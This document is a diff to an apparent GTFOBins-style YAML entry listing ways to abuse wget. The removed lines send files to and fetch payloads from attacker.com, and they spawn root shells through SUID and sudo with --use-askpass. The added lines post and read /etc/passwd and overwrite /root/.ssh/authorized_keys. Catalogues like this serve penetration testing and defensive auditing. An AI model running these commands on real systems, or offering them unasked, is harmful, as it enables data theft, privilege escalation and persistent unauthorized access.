@@ -1,42 +1,23 @@
 ---
 functions:
   command:
-    - code: |
-        wget --use-askpass=_command_ 0
+    - description: Can be used to execute any command or file on a system, but without any arguments, and without stdout/stderr. This can be useful if you are able to write an executable to the server beforehand. The example here invokes /sbin/reboot.
+      code: |
+        wget --use-askpass=/sbin/reboot http://0/
   file-upload:
-    - description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.
+    - description: Send a local file to a remote server in a POST request. Note that the file will be sent as-is.
       code: |
-        URL=http://attacker.com/
-        LFILE=file_to_send
-        wget --post-file=$LFILE $URL
+        wget --post-file=/etc/passwd http://0/
   file-read:
-    - description: The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.
+    - description: Read local files by importing the file as URIs to be retrieved. The content of the file will be displayed as error messages.
       code: |
-        LFILE=file_to_read
-        wget -i $LFILE
+        wget --input-file=/etc/passwd http://0/
   file-write:
-    - description: The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.
+    - description: Reads local data and writes the output to a file. This is only suitable for displaying non-binary files, as the output is an error-log.
       code: |
-        LFILE=file_to_write
-        TF=$(mktemp)
-        echo DATA > $TF
-        wget -i $TF -o $LFILE
+        wget --input-file=/etc/passwd --output-file=/tmp/passwd.txt
   file-download:
-    - description: Fetch a remote file via HTTP GET request.
+    - description: Downloads a remote file via an HTTP GET request and saves it to a specific location.
       code: |
-        URL=http://attacker.com/file_to_get
-        LFILE=file_to_save
-        wget $URL -O $LFILE
-  suid:
-    - code: |
-        TF=$(mktemp)
-        chmod +x $TF
-        echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
-        ./wget --use-askpass=$TF 0
-  sudo:
-    - code: |
-        TF=$(mktemp)
-        chmod +x $TF
-        echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
-        sudo wget --use-askpass=$TF 0
+        wget --output-document=/root/.ssh/authorized_keys http://0/
 ---
